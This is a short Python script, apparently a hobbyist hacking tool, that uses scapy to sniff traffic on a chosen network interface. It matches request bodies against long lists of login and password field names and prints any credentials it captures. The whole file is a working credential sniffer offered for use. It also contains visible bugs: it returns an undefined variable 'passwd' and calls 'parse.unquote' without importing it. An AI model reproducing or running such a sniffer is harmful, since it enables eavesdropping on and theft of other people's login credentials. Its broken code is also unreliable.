from  scapy.all import *
import termcolor
import re

class PasswordSniffer:
	iface='docker0'
	def get_login_pass(self,body):
		user=None
		password=None
		userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name','alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname','login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename','uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username','login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
		passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword','login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password','passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena']

		for login in userfields:
			login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
			if login_re:
				user = login_re.group()
		for passfield in passfields:
			pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
			if pass_re:
				password = pass_re.group()
		if user and password:
			return (user, passwd) 


	def packet_parser(self,packet):
		print(termcolor.colored('[+] packet following {}'.format(packet),'yellow'))

		if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
			body=str(packet[TCP].payload)
			user_pass_res=self.get_login_pass(body)
			if user_pass_res:
				print(parse.unquote(user_pass_res[0]))
				print(parse.unquote(user_pass_res[1]))

	def get_started(self):
		self.iface= input(termcolor.colored('[+] Enter your Ethernet Interface like eth0,eth1,etc','yellow'))
		try:
			print(termcolor.colored('[+] Congratulation, It is working {}'.format(self.iface),'green'))
			eyy=sniff(iface=self.iface, prn=self.packet_parser, store=0)
		
		except KeyboardInterrupt:
			print(termcolor.colored('[+] You have interrupted','yellow'))
		except Exception as error:
			print(termcolor.colored('[-] Error {}'.format(error),'red'))
obj=PasswordSniffer()
obj.get_started()